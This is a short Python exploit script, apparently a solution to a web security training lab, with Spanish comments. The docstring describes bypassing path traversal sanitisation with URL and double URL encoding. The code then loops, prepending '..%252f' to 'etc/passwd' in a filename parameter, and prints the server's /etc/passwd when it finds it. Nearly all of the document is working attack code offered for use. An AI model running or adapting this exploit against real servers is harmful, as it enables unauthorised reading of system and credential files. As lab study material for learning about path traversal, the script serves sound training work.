"""
In some contexts, such as in a URL path or the filename parameter of a multipart/form-data request, web servers may strip any directory traversal sequences before passing your input to the application. You can sometimes bypass this kind of sanitization by URL encoding, or even double URL encoding, the ../ characters. This results in %2e%2e%2f and %252e%252e%252f respectively. Various non-standard encodings, such as ..%c0%af or ..%ef%bc%8f, may also work.

For Burp Suite Professional users, Burp Intruder provides the predefined payload list Fuzzing - path traversal. This contains some encoded path traversal sequences that you can try.


Objectivo: Recuperal el contenido del archivo etc/passwd


"""


import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = { 'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080' }
TRAVERSAL_PATTERN="..%252f"

def peticion(url, payload):
    image_url = f"{url}/image?filename={payload}"
    r = requests.get(image_url, verify=False, proxies=proxies)
    return r

def directory_traversal_exploit(url, TRAVERSAL_PATTERN):
    payload = "etc/passwd"
    while True:
        print(payload)
        r = peticion(url, payload)
        if r.status_code // 100 == 2:
            if "root:x" in r.text:
                print("[+] La vulnerabilidad Directory Traversal ha sido explotada con éxito")
                print("[+] Contenido del archivo /etc/passwd:")
                print(r.text)
                break
            else:
                print("[-] La vulnerabilidad Directory Traversal no ha sido explotada con éxito")
                print("[-] El archivo /etc/passwd no ha sido encontrado")
                sys.exit(-1)
        else:
            print(f"El código de estado de la petición es: {r.status_code}")
        payload = TRAVERSAL_PATTERN + payload

def main():
    if len(sys.argv) != 2:
        print("[+] Uso: %s <url>" % sys.argv[0])
        print("[+] Ejemplo: %s www.misitio.com" % sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]
    print("[+] Explotando la vulnerabilidad Directory Traversal")
    directory_traversal_exploit(url, TRAVERSAL_PATTERN)

if __name__ == "__main__":
    main()